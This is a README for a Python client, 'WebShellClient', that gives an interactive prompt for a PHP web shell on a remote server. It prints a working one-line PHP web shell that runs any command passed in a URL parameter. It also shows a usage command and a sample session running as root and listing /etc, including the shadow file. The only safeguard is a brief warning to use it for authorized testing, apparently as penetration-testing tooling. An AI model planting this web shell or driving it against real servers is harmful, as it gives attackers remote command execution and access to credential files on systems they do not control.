# WebShellClient

## Overview
This script acts as a client for interacting with a simple web shell, which must be hosted on a remote server. The web shell should be implemented as a PHP script, such as:

```php
<?php system($_GET['cmd']); ?>
```

This PHP script allows the execution of system commands via an HTTP request by passing the command as a `cmd` parameter.

## How It Works
The WebShell Client script:
- Accepts the base URL of the web shell as an argument (must end with `?cmd=`).
- Establishes an interactive shell-like experience.
- Supports `cd` commands to simulate directory navigation.
- Stores command history for convenience.
- Provides colorized terminal output.

## Usage
To run the script, execute:

```sh
python3 web_shell.py http://example.com/shell.php?cmd=
```

### Features:
- Interactive shell-like prompt (`user@webshell:path$`).
- Supports navigation with `cd` command.
- Maintains session history.
- Displays output in color.
- Gracefully handles exit with `exit` or `quit`.

## Security Warning
This script interacts with a web shell that executes system commands on the remote server. **Only use this for authorized testing purposes in controlled environments.** Exposing such a shell on the internet poses extreme security risks.

## Example Interaction
```
user@webshell:/var/www$ ls -la
(total 12)
-rw-r--r-- 1 root root  21 Jan 29 15:00 index.php
-rw-r--r-- 1 root root  29 Jan 29 15:02 shell.php

user@webshell:/var/www$ whoami
root

user@webshell:/var/www$ cd /etc

user@webshell:/etc$ ls
passwd   group   shadow
```

